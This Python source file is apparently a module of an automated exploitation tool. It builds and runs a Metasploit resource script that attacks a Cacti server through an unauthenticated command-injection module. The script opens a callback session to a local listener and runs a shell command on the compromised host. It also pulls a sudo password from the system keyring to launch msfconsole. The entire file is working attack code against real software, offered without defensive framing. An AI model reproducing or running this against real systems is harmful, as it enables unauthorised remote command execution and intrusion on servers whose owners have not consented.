from Metode import *
import re
import keyring

class CExploit(Exploit):

    def __init__(self):
        super().__init__()

    def makePayload(self, params=list):
        print("[DEBUG] target: ", self.targets)
        self.targets = params
        print(f"params : {self.targets}")
        self._payload = f"""
    use exploit/linux/http/cacti_unauthenticated_cmd_injection
    set RHOSTS {self.targets[0][0]}
    set RPORT {self.targets[0][1]}
    set LHOST {self._lHost}
    set TARGETURI /cacti
    set ForceExploit True
    exploit -j
    sleep 20
    sessions -i
    sessions -c 'ls -la' -i 1
    sleep 10
    exit
    exit -y
    """
        with open("exploitResource.rc", "w") as file:
            file.write(self._payload)

    def startExploit(self):
        #self.attkCommand = ["sudo", "-S", "msfconsole", "-q", "-r", "exploitResource.rc"]
        self.attkCommand = "sudo -S msfconsole -q -r exploitResource.rc"
        sudo_pass = keyring.get_password("system", "sudo")
        try:
            result = subprocess.run(self.attkCommand,
                                    input=sudo_pass,
                                    #stdout=subprocess.PIPE,
                                    #stderr=subprocess.PIPE,
                                    capture_output=True,
                                    text=True,
                                    shell=True)

            if result.stdout:
                exploit_output = re.sub(r"\x1b\[[0-9;]*[mK]", "", result.stdout)
                with open(f"{self.targets[0][0]}_exploit.txt", "w") as f:
                    f.write(exploit_output)
        except subprocess.CalledProcessError as e:
            print("Error occurred during exploit:")
            print(str(e))
            error_output = result.stdout if e.output else "Unknown error occurred."
            with open(f"{self.targets[0][0]}_exploit_cacti_error.txt", "w") as file:
                file.write(error_output)
    
